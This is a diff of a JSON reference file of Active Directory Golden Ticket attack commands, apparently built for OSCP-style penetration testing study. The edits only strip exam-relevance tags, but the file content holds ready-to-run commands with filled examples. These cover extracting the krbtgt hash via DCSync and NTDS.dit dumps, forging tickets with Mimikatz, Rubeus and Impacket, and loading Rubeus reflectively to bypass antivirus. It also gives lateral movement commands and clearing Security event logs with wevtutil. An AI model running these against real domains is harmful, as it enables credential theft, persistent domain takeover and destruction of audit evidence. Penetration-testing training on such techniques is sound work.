@@ -1,7 +1,6 @@
 {
   "metadata": {
     "file_purpose": "Active Directory Golden Ticket Attack Commands - Complete reference for creating and using TGT forgery attacks to achieve domain-wide persistence and access",
-    "oscp_relevance": "High-priority persistence technique. Golden Tickets provide domain-wide access by forging TGTs using the krbtgt account hash. Critical for maintaining access after domain compromise. More powerful than Silver Tickets (which target specific services). Commonly tested in OSCP lab environments.",
     "educational_context": "Golden Tickets leverage the Kerberos authentication protocol by forging Ticket Granting Tickets (TGTs) using the krbtgt account's password hash. Unlike Silver Tickets (forged TGS for specific services), Golden Tickets grant domain-wide access because they're encrypted with the krbtgt secret key. The krbtgt password rarely changes (only on domain functional level upgrades from pre-2008), making this an excellent persistence mechanism.",
     "prerequisites": [
       "Domain Admin access OR Domain Controller compromise (to obtain krbtgt hash)",
@@ -92,10 +91,8 @@
         "MIMIKATZ",
         "PERSISTENCE",
         "HASH_EXTRACTION",
-        "OSCP:HIGH",
         "WINDOWS"
       ],
-      "oscp_relevance": "high",
       "notes": "DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt\n\nOr PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\"'\n\nTIME ESTIMATE: 30 seconds - 1 minute (including verification)",
       "filled_example": "mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt"
     },
@@ -150,11 +147,9 @@
         "MIMIKATZ",
         "PERSISTENCE",
         "HASH_EXTRACTION",
-        "OSCP:MEDIUM",
         "WINDOWS",
         "REQUIRES_DC_ACCESS"
       ],
-      "oscp_relevance": "medium",
       "notes": "LSA dump requires PHYSICAL (or RDP) access to the Domain Controller, making it less stealthy than DCSync. However, it's useful when: (1) You've already compromised the DC, (2) Replication rights are unavailable, (3) DCSync is being monitored. IMPORTANT: This method dumps ALL domain account hashes, not just krbtgt. Save the output to a file for later analysis. The krbtgt hash is marked with RID 000001f6 (502 in decimal). Time estimate: 10-20 seconds for dump completion.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz on the DC, you can:\n1. Use Impacket remotely: secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc\n2. Extract NTDS.dit and SYSTEM hive, then parse offline: ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\temp\\ntds' quit quit\n3. Use built-in tools: reg save HKLM\\SYSTEM SystemBkup.hiv && reg save HKLM\\SAM SAMBkup.hiv\n\nTIME ESTIMATE: 30 seconds - 1 minute (including privilege escalation to SYSTEM)"
     },
     {
@@ -197,10 +192,8 @@
         "MIMIKATZ",
         "CLEANUP",
         "TICKET_MANIPULATION",
-        "OSCP:HIGH",
         "WINDOWS"
       ],
-      "oscp_relevance": "high",
       "notes": "Ticket purging is OPTIONAL but highly recommended for clean Golden Ticket injection. If you don't purge, Windows may use cached legitimate tickets instead of your forged Golden Ticket, causing authentication to fail or use the wrong identity. Best practice: Always purge before injecting any forged ticket (Golden or Silver). This operation is reversible - simply re-authenticate to domain resources to generate new legitimate tickets. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows command (requires elevation):\nklist purge\n\nPowerShell alternative:\nInvoke-Mimikatz -Command '\"kerberos::purge\"'\n\nComplete cleanup (close sessions + purge):\nnet use * /delete /y && klist purge\n\nTIME ESTIMATE: < 5 seconds"
     },
     {
@@ -291,10 +284,8 @@
         "PRIVILEGE_ESCALATION",
         "TICKET_FORGERY",
         "DOMAIN_DOMINANCE",
-        "OSCP:HIGH",
         "WINDOWS"
       ],
-      "oscp_relevance": "high",
       "notes": "Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.\n\nMANUAL ALTERNATIVES:\nRubeus alternative (C# implementation):\nRubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt\n\nImpacket alternative (Linux):\nticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>\nexport KRB5CCNAME=<USERNAME>.ccache\npsexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass\n\nPowerShell (Invoke-Mimikatz):\nInvoke-Mimikatz -Command '\"kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt\"'\n\nTIME ESTIMATE: 10-15 seconds (creation + injection)",
       "filled_example": "mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt"
     },
@@ -383,10 +374,8 @@
         "PRIVILEGE_ESCALATION",
         "TICKET_FORGERY",
         "AV_EVASION",
-        "OSCP:MEDIUM",
         "WINDOWS"
       ],
-      "oscp_relevance": "medium",
       "notes": "Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.\n\nMANUAL ALTERNATIVES:\nAES256 encryption (stealthier):\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt\n\nSave to file instead of injecting:\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi\nRubeus.exe ptt /ticket:ticket.kirbi\n\nReflective loading (bypass AV):\n[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))\n[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())\n\nTIME ESTIMATE: 15-30 seconds (including AV bypass if needed)",
       "filled_example": "Rubeus.exe golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /rc4:1693c6cefafffc7af11ef34d1c788f47 /ptt"
     },
@@ -439,10 +428,8 @@
         "GOLDEN_TICKET",
         "VERIFICATION",
         "TICKET_ENUMERATION",
-        "OSCP:HIGH",
         "WINDOWS"
       ],
-      "oscp_relevance": "high",
       "notes": "ALWAYS verify ticket injection with klist before attempting lateral movement. This confirms: (1) Ticket was successfully created and injected, (2) Correct domain and realm, (3) Valid encryption and ticket flags, (4) Ticket hasn't expired. Key indicators of Golden Ticket: (1) Server: krbtgt/<domain> (it's a TGT, not service ticket), (2) Extremely long validity period (default 10 years), (3) Client name matches your /user parameter. EXAM TIP: If klist shows no tickets but Mimikatz said 'successfully submitted', you may need to open a new command prompt with 'mimikatz # misc::cmd' to inherit the ticket. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nMimikatz alternative:\nmimikatz # kerberos::list\n\nRubeus alternative:\nRubeus.exe klist\n\nPowerShell (requires admin):\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4768]]\" | Select TimeCreated, Message\n\nDetailed ticket analysis:\nklist -li 0x3e7 (SYSTEM session)\nklist sessions (all sessions, requires admin)\n\nTIME ESTIMATE: < 5 seconds"
     },
     {
@@ -506,10 +493,8 @@
         "PSEXEC",
         "PERSISTENCE",
         "DOMAIN_DOMINANCE",
-        "OSCP:HIGH",
         "WINDOWS"
       ],
-      "oscp_relevance": "high",
       "notes": "This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\\\DC1\\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.\n\nMANUAL ALTERNATIVES:\nAlternative lateral movement methods with Golden Ticket:\n\n1. WMI:\nwmic /node:<TARGET_FQDN> process call create \"cmd.exe /c <command>\"\n\n2. WinRM (PowerShell):\nEnter-PSSession -ComputerName <TARGET_FQDN>\n\n3. Direct SMB access:\ndir \\\\<TARGET_FQDN>\\C$\ncopy file.txt \\\\<TARGET_FQDN>\\C$\\Temp\\\n\n4. RDP:\nmstsc /v:<TARGET_FQDN>\n\n5. Impacket (Linux):\nexport KRB5CCNAME=ticket.ccache\npsexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass\n\n6. Scheduled task:\nschtasks /create /tn \"Update\" /tr \"cmd.exe /c <command>\" /sc once /st 00:00 /S <TARGET_FQDN>\n\nTIME ESTIMATE: 10-20 seconds (connection + authentication)",
       "filled_example": "PsExec.exe \\\\DC1 cmd.exe"
     },
@@ -547,11 +532,9 @@
         "CLEANUP",
         "OPSEC",
         "FORENSICS",
-        "OSCP:MEDIUM",
         "WINDOWS"
       ],
-      "oscp_relevance": "medium",
-      "notes": "OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In OSCP, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows:\nklist purge\n\nComplete cleanup:\nklist purge && net use * /delete /y\n\nEvent log cleanup (requires admin):\nwevtutil cl Security\nwevtutil cl System\n\nAlternative: Reboot (clears all tickets):\nshutdown /r /t 0\n\nTIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)"
+      "notes": "OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In certification, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows:\nklist purge\n\nComplete cleanup:\nklist purge && net use * /delete /y\n\nEvent log cleanup (requires admin):\nwevtutil cl Security\nwevtutil cl System\n\nAlternative: Reboot (clears all tickets):\nshutdown /r /t 0\n\nTIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)"
     },
     {
       "id": "ad-golden-ticket-ticketer-create",
@@ -565,8 +548,7 @@
         "ACTIVE_DIRECTORY",
         "KERBEROS",
         "GOLDEN_TICKET",
-        "IMPACKET",
-        "OSCP:HIGH"
+        "IMPACKET"
       ],
       "variables": [
         {
@@ -608,7 +590,6 @@
         "Error creating ticket"
       ],
       "notes": "Creates .ccache file. Export: export KRB5CCNAME=Administrator.ccache. Then use with: psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass",
-      "oscp_relevance": "high",
       "filled_example": "impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator"
     },
     {
@@ -622,8 +603,7 @@
       "tags": [
         "ACTIVE_DIRECTORY",
         "KERBEROS",
-        "TIME_SYNC",
-        "OSCP:HIGH"
+        "TIME_SYNC"
       ],
       "variables": [
         {
@@ -644,7 +624,6 @@
         "no server suitable for synchronization found"
       ],
       "notes": "Kerberos requires <5 minute clock skew. Essential before ticket operations. Alternative: rdate -n <DC_IP> or faketime for non-root.",
-      "oscp_relevance": "high",
       "filled_example": "ntpdate -u 192.168.50.70"
     },
     {
@@ -659,8 +638,7 @@
         "ACTIVE_DIRECTORY",
         "KERBEROS",
         "RUBEUS",
-        "TGT",
-        "OSCP:HIGH"
+        "TGT"
       ],
       "variables": [
         {
@@ -698,7 +676,6 @@
         "Client not found in Kerberos database"
       ],
       "notes": "Use /rc4:<hash> or /aes256:<hash> instead of /password for pass-the-hash. Verify with: klist",
-      "oscp_relevance": "high",
       "filled_example": "Rubeus.exe asktgt /user:Administrator /password:Password123! /domain:corp.local /ptt"
     }
   ]
